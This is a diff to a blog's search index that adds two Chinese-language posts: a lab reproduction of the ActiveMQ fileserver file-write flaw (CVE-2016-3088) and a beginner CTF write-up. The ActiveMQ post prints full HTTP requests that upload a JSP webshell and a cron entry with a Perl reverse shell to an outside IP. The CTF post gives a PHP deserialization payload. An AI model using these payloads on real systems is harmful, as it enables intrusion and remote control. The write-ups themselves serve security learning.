@@ -62,6 +62,161 @@
       </tags>
   </entry>
   <entry>
+    <title>ActActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)</title>
+    <url>/2024/05/31/ActActiveMQ-Arbitrary-File-Write-Vulnerability-CVE-2016-3088/</url>
+    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>
+
+<h1 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h1><p>5,14.0之前的版本</p>
+<p>5.12.x~5.13.x:需要开启fileserver应用(此应用默认关闭)</p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
+<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷。</p>
+<p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
+<h1 id="漏洞详细"><a href="#漏洞详细" class="headerlink" title="漏洞详细"></a>漏洞详细</h1><p>既然可以写入文件并且可以移动，那就会有下面四种方法，不过只能复现成功前两种，看了很多文章3,4好像也没什么人复现出来，而p神也只留下一句话：理论上可以，但尚未测试。。。。。。。。有种费马解费马大定理的美，然后我自己的功力当然也是做不到了的</p>
+<ol>
+<li>写入webshell</li>
+<li>写入cron</li>
+<li>写入jar或jetty.xml等库和配置文件</li>
+<li>写入ssh key</li>
+</ol>
+<h1 id="知识点学习"><a href="#知识点学习" class="headerlink" title="知识点学习"></a>知识点学习</h1><h2 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><code>PUT</code> 请求用于向服务器更新指定资源，可以理解为对服务器上的资源进行修改操作。使用 <code>PUT</code> 请求方式会覆盖原有的资源内容，因此需要谨慎使用。</p>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>本地一直没弄成功,PUT方法是一直被锁的</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531142351189.png"  alt="image-20240531142351189"></p>
+<p><a class="link"   href="https://www.cnblogs.com/kuoaidebb/p/4466602.html" >HTTP - PUT 上传文件&#x2F;Shell - 阔爱的贝贝 - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>不过这put虽说可以上传，但是上传的目录是被锁死的，只要这个目录里不解析webshell也没辙，主要是这个Move有点伤</p>
+<h2 id="Move请求"><a href="#Move请求" class="headerlink" title="Move请求"></a>Move请求</h2><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>linux上的定时任务</p>
+<p><a class="link"   href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html" >Linux Crontab 定时任务 | 菜鸟教程 (runoob.com)<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240531151440878.png"  alt="image-20240531151440878"></p>
+<p>每隔一分钟复制1.txt成2.txt到根目录，当然这个命令只能执行一次，因为不能同名吧，我主要想实验是发起任务的那一刻开启做，还是一分钟后开始做</p>
+<p>使用crontab命令是把定时任务设置在&#x2F;tmp&#x2F;crontab里的，名字随机，不好推出了并且写入</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152305281.png"  alt="image-20240531152305281"></p>
+<p>所以我们找到可以直接写入的<code>/etc/cron.d</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152513931.png"  alt="image-20240531152513931"></p>
+<p>有三个用户，一般使用root用户</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>开日</p>
+<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240531155110593.png"  alt="image-20240531155110593"></p>
+<p>弱口令爆破admin&#x2F;admin</p>
+<p>访问已经站点<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>信息收集</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531155345986.png"  alt="image-20240531155345986"></p>
+<p>我们只需要两个信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activemq.base	/opt/activemq  #网站根目录，会解析jsp木马文件</span><br><span class="line">user.name	root               #/etc/cron.d目录所有者是root，若这里不是root估计打不成功</span><br></pre></td></tr></table></figure>
+
+<p>接着我们向fileserver上传文件</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>779</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">&lt;%!</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">class</span> U <span class="keyword">extends</span> ClassLoader &#123;</span></span><br><span class="line"><span class="language-gradle">U(ClassLoader c) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">super</span>(c);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">Class</span> g(<span class="keyword">byte</span>[] b) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"> </span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.<span class="keyword">class</span>).invoke(clazz.newInstance(), str);</span></span><br><span class="line"><span class="language-gradle">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">Object decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="keyword">null</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.<span class="keyword">class</span>).invoke(decoder, str);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%</span></span><br><span class="line"><span class="language-gradle">String cls = request.getParameter(<span class="string">&quot;ewoji&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>记住后缀不能是jsp</p>
+<p>接着Move</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/ewoji.jsp</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功将木马打入</p>
+<p>注意这里ewoji.txt一定要和ewoji.jsp前缀名字相同，不然会把ewoji.jsp视为一个文件，fileserver会异常关闭，就打不了了呀</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531215835511.png"  alt="image-20240531215835511"></p>
+<p>antsword启动</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161710100.png"  alt="image-20240531161710100"></p>
+<p>需要admin权限，记得加请求头</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161641254.png"  alt="image-20240531161641254"></p>
+<p>getshell !!!!</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531221257330.png"  alt="image-20240531221257330"></p>
+<h2 id="写入crontab"><a href="#写入crontab" class="headerlink" title="写入crontab"></a>写入crontab</h2><p>大致和上面的一样，就是不用登录</p>
+<p>上传</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>250</span><br><span class="line"></span><br><span class="line"><span class="language-tcl">*/<span class="number">1</span> * * * * root /usr/bin/perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;47.100.177.241&quot;</span>;<span class="variable">$p</span>=<span class="number">23333</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240606143921794.png"  alt="image-20240606143921794"></p>
+<p>如果是用bp，请确保正文最后是\n而不是\r\n</p>
+<p>移动</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///etc/cron.d/root</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+
+<p>等待一下</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240606144408059.png"  alt="image-20240606144408059"></p>
+<p>getshell !!!</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.对上传的文件内容进行检测</p>
+<p>2.限制move方法</p>
+]]></content>
+      <categories>
+        <category>复现</category>
+      </categories>
+      <tags>
+        <tag>复现</tag>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HDCTF Junior 2024 Winter WP</title>
+    <url>/2024/02/22/HDCTF-Junior-2024-Winter-WP/</url>
+    <content><![CDATA[<h1 id="新生选拔赛"><a href="#新生选拔赛" class="headerlink" title="新生选拔赛"></a>新生选拔赛</h1><span id="more"></span>
+
+<h1 id="朴实无华的http"><a href="#朴实无华的http" class="headerlink" title="朴实无华的http"></a>朴实无华的http</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240222183840891.png" ></p>
+<p>这是刚刚拿到题的样子,F12没反应,ctrl+U看看</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222183956685.png" ></p>
+<p>没什么卵用,只知道把F12和F1 ban掉了</p>
+<p>题目没给什么描述,源码也没有信息,直接开扫,dirsearch.py启动!</p>
+<p>最后扫出来个robot.txt</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184449835.png" ></p>
+<p>进入你，httttttp.php</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184604048.png" ></p>
+<p>接下来就很常规的把Referer,UA填好,就进入了经典试ip环节,用收集的词典在burpsuite爆一下就出来了.</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185535104.png"  alt="兄弟爆一下，说说你心里话"></p>
+<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>最想吐的一集，虽然拿了个一血，但这题差点把我血都放完了</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185800522.png" ></p>
+<p>因为一开始服务器挺卡的，点这题老是调到别的地方，我还以为题目出错了，一看原来有个$_GET[‘entrance’]，够坏哈</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这题的思路到是比较明确，想出来并不要多少时间,漏洞点是在$fuction($cmd),于是我们对这两个值进行覆盖即可rce，</p>
+<p>那么就反推回去</p>
+<p>什么能触发invoke呢—&gt;damn类中的toString可以触发,什么触发toString—&gt;类pop的set，什么触发set—&gt;类air的call,什么触发call—&gt;类hnusec的destruct</p>
+<p>开始下手</p>
+<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>这里的base64解码编码，private变量旁边的%00弄得我好崩溃.</p>
+<p>先看我的payload:</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222190634907.png" ></p>
+<p>$b&#x3D;’O:6:”hnusec”:2:{s:3:”exp”;O:3:”air”:1:{s:3:”exp”;O:3:”pop”:2:{s:8:”%00pop%00exp”;N;s:4:”exp2”;O:18:”damndamndamdanmdan”:1:{s:3:”exp”;O:7:”exploit”:2:{s:8:”function”;s:6:”system”;s:3:”cmd”;s:2:”ls”;}}}}}’</p>
+<p>以为到这里就差不多得了?想多了</p>
+<h2 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h2><p>这个需要版本限制，具体不记得</p>
+<p>我们知道wakeup触发时机是在unserialize之前，那么这里我们肯定不能让它触发.</p>
+<p>绕过的方式是:修改pop链属性个数使他大于真实个数即可绕过</p>
+<h2 id="private旁边的-00"><a href="#private旁边的-00" class="headerlink" title="private旁边的%00"></a>private旁边的%00</h2><p>这里够我喝一壶的了</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222191033249.png" ></p>
+<p>注意看，这个变量叫pop,它的两边有两个不知道什么东西的东西,其实它是ASCII里面的0，在url中是%00.</p>
+<p>按我之前的经验来看，我们只需手动添加%00在pop两边，接着$_GET传参即可,但是你先别急</p>
+<p>这里GET传进去的pop链是要经过base64编码解码的，于是像上面说的这样子干，那么我们传入的便是%00,而不是经过服务器解析后的那个符号0,所以php理所当然是识别不了%00的，所以识别不了pop，一个地方崩整个崩</p>
+<p>问题到这里很明确了——如何让php识别pop旁边那两个东西呢?这里用php中的chr()函数，它会将ascii十进制数转化为符号,我们还要注意字符串的拼接用.来连接</p>
+<p>$b&#x3D;’O:6:”hnusec”:2:{s:3:”exp”;O:3:”air”:1:{s:3:”exp”;O:3:”pop”:2:{s:8:”‘<strong>.chr(0).</strong>‘pop’<strong>.chr(0).</strong>‘exp”;N;s:4:”exp2”;O:18:”damndamndamdanmdan”:1:{s:3:”exp”;O:7:”exploit”:2:{s:8:”function”;s:6:”system”;s:3:”cmd”;s:2:”ls”;}}}}}’</p>
+<p>接着就是无限制的rce，不多赘述</p>
+<h1 id="フィナーレ。"><a href="#フィナーレ。" class="headerlink" title="フィナーレ。"></a>フィナーレ。</h1><p>这题是考察php特性和无参数rce</p>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192112186.png" ></p>
+<p>这里是强等于,0e绕过不能用,那就用数组绕过,当md5()里面传入一个数组时，编译器会报错但不影响它继续执行后返回null，结果null&#x3D;&#x3D;&#x3D;null，成功绕过</p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192647039.png" ></p>
+<p>这里直接传入114514就好了，目的应该不是考察intval绕过，让我们认识这个函数而已</p>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222193337316.png" ></p>
+<p>说是命令执行，但这样写没反应，应该是有过滤，抓个包看看</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222193645229.png" ></p>
+<p>果然啊，果然，过滤了好多，linux指令在这里我是不会用了,用php的函数写的</p>
+<p>scandir():查看目录下有什么文件,传的参数就是路径</p>
+<p>readfile():读取文件</p>
+<p>这里先print_r(scandir(.))查看根目录(为什么是print_r不是echo,因为这里返回的是数组，echo处理不了)</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194101516.png" ></p>
+<p>这里我们在前三层找到flag文件，读取</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194422918.png" ></p>
+<p>这里的readfile()平替很多,比如highlight_file,show_source,网上还有几个吧</p>
+<h1 id="カゲロウデイズ"><a href="#カゲロウデイズ" class="headerlink" title="カゲロウデイズ"></a>カゲロウデイズ</h1><p>运气最好的一集，说是考察脚本能力，但我一个脚本没写，全靠运气</p>
+<p>题目说了密码在css文件里面</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194810531.png" ></p>
+<p>这里我们复制下来，在记事本可以把注释批量去掉</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194905273.png" ></p>
+<p>一看就是base64，但我做到这里的时候没有去解码，而是直接拿去burpsuite爆了，结果啥都没爆出来，然后我就拿去解码了</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240222195102450.png" ></p>
+<p>然后我想是不是要写个脚本把这些字符拼接起来，然后我在乱翻的时候，哎哟我，这不key is 谁谁谁吗，然后直接拿去试，还真得了，全靠运气<img   src="/../img/$%7Bfiilename%7D/image-20240222195234074.png" ></p>
+<p>又是点击题，反正上次也是用连点器做出来的，这次也用了，没想到了设置了点击间隔时间的限制，然后我调到0.2s点一次完了给他挂个30来分钟就出来了，就当休息一下哈哈哈</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>  记录一下第一次打的完整的ctf，早上准备开打的时候简直兴奋的发抖，打开题目像癫了一样乱搞，现在回想还真是浪费精力啊，这是一场持久战，还是得慢慢来,最后也是差一题ak，已经超出我的预期了。</p>
+<p>  复盘了一下今天的操作，感觉有几方面需要说出来指正</p>
+<p>  1.资料乱开，又不关，导致全面页面，乱糟糟(最后burpsuite还差点干爆我电脑)</p>
+<p>  2.没有备份的习惯，解题过程中看到的很多信息都是要记录的，今天重新复制粘贴占了蛮多时间</p>
+<p>  3.赛前准备不足，虽然知道今天应该会有http的题，但是忘记去找ip了，今天去找又花了蛮久，痛啊</p>
+<p>道阻且长，同志们还需努力.</p>
+]]></content>
+      <tags>
+        <tag>ctf</tag>
+        <tag>wp</tag>
+        <tag>入门</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CISCN2024-web复现</title>
     <url>/2024/05/21/CISCN2024-web%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="初遇国赛"><a href="#初遇国赛" class="headerlink" title="初遇国赛"></a>初遇国赛</h1><span id="more"></span>
@@ -201,83 +356,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HDCTF Junior 2024 Winter WP</title>
-    <url>/2024/02/22/HDCTF-Junior-2024-Winter-WP/</url>
-    <content><![CDATA[<h1 id="新生选拔赛"><a href="#新生选拔赛" class="headerlink" title="新生选拔赛"></a>新生选拔赛</h1><span id="more"></span>
-
-<h1 id="朴实无华的http"><a href="#朴实无华的http" class="headerlink" title="朴实无华的http"></a>朴实无华的http</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240222183840891.png" ></p>
-<p>这是刚刚拿到题的样子,F12没反应,ctrl+U看看</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222183956685.png" ></p>
-<p>没什么卵用,只知道把F12和F1 ban掉了</p>
-<p>题目没给什么描述,源码也没有信息,直接开扫,dirsearch.py启动!</p>
-<p>最后扫出来个robot.txt</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184449835.png" ></p>
-<p>进入你，httttttp.php</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184604048.png" ></p>
-<p>接下来就很常规的把Referer,UA填好,就进入了经典试ip环节,用收集的词典在burpsuite爆一下就出来了.</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185535104.png"  alt="兄弟爆一下，说说你心里话"></p>
-<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>最想吐的一集，虽然拿了个一血，但这题差点把我血都放完了</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185800522.png" ></p>
-<p>因为一开始服务器挺卡的，点这题老是调到别的地方，我还以为题目出错了，一看原来有个$_GET[‘entrance’]，够坏哈</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这题的思路到是比较明确，想出来并不要多少时间,漏洞点是在$fuction($cmd),于是我们对这两个值进行覆盖即可rce，</p>
-<p>那么就反推回去</p>
-<p>什么能触发invoke呢—&gt;damn类中的toString可以触发,什么触发toString—&gt;类pop的set，什么触发set—&gt;类air的call,什么触发call—&gt;类hnusec的destruct</p>
-<p>开始下手</p>
-<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>这里的base64解码编码，private变量旁边的%00弄得我好崩溃.</p>
-<p>先看我的payload:</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222190634907.png" ></p>
-<p>$b&#x3D;’O:6:”hnusec”:2:{s:3:”exp”;O:3:”air”:1:{s:3:”exp”;O:3:”pop”:2:{s:8:”%00pop%00exp”;N;s:4:”exp2”;O:18:”damndamndamdanmdan”:1:{s:3:”exp”;O:7:”exploit”:2:{s:8:”function”;s:6:”system”;s:3:”cmd”;s:2:”ls”;}}}}}’</p>
-<p>以为到这里就差不多得了?想多了</p>
-<h2 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h2><p>这个需要版本限制，具体不记得</p>
-<p>我们知道wakeup触发时机是在unserialize之前，那么这里我们肯定不能让它触发.</p>
-<p>绕过的方式是:修改pop链属性个数使他大于真实个数即可绕过</p>
-<h2 id="private旁边的-00"><a href="#private旁边的-00" class="headerlink" title="private旁边的%00"></a>private旁边的%00</h2><p>这里够我喝一壶的了</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222191033249.png" ></p>
-<p>注意看，这个变量叫pop,它的两边有两个不知道什么东西的东西,其实它是ASCII里面的0，在url中是%00.</p>
-<p>按我之前的经验来看，我们只需手动添加%00在pop两边，接着$_GET传参即可,但是你先别急</p>
-<p>这里GET传进去的pop链是要经过base64编码解码的，于是像上面说的这样子干，那么我们传入的便是%00,而不是经过服务器解析后的那个符号0,所以php理所当然是识别不了%00的，所以识别不了pop，一个地方崩整个崩</p>
-<p>问题到这里很明确了——如何让php识别pop旁边那两个东西呢?这里用php中的chr()函数，它会将ascii十进制数转化为符号,我们还要注意字符串的拼接用.来连接</p>
-<p>$b&#x3D;’O:6:”hnusec”:2:{s:3:”exp”;O:3:”air”:1:{s:3:”exp”;O:3:”pop”:2:{s:8:”‘<strong>.chr(0).</strong>‘pop’<strong>.chr(0).</strong>‘exp”;N;s:4:”exp2”;O:18:”damndamndamdanmdan”:1:{s:3:”exp”;O:7:”exploit”:2:{s:8:”function”;s:6:”system”;s:3:”cmd”;s:2:”ls”;}}}}}’</p>
-<p>接着就是无限制的rce，不多赘述</p>
-<h1 id="フィナーレ。"><a href="#フィナーレ。" class="headerlink" title="フィナーレ。"></a>フィナーレ。</h1><p>这题是考察php特性和无参数rce</p>
-<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192112186.png" ></p>
-<p>这里是强等于,0e绕过不能用,那就用数组绕过,当md5()里面传入一个数组时，编译器会报错但不影响它继续执行后返回null，结果null&#x3D;&#x3D;&#x3D;null，成功绕过</p>
-<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192647039.png" ></p>
-<p>这里直接传入114514就好了，目的应该不是考察intval绕过，让我们认识这个函数而已</p>
-<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222193337316.png" ></p>
-<p>说是命令执行，但这样写没反应，应该是有过滤，抓个包看看</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222193645229.png" ></p>
-<p>果然啊，果然，过滤了好多，linux指令在这里我是不会用了,用php的函数写的</p>
-<p>scandir():查看目录下有什么文件,传的参数就是路径</p>
-<p>readfile():读取文件</p>
-<p>这里先print_r(scandir(.))查看根目录(为什么是print_r不是echo,因为这里返回的是数组，echo处理不了)</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194101516.png" ></p>
-<p>这里我们在前三层找到flag文件，读取</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194422918.png" ></p>
-<p>这里的readfile()平替很多,比如highlight_file,show_source,网上还有几个吧</p>
-<h1 id="カゲロウデイズ"><a href="#カゲロウデイズ" class="headerlink" title="カゲロウデイズ"></a>カゲロウデイズ</h1><p>运气最好的一集，说是考察脚本能力，但我一个脚本没写，全靠运气</p>
-<p>题目说了密码在css文件里面</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194810531.png" ></p>
